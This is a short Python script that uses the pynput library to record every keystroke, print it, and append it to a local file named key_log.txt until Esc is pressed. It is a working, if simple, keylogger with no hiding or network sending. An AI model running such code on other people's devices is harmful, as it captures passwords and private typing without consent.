import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    print("{0} is pressed".format(key))
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("key_log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)
        f.write('\n')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:

    listener.join()
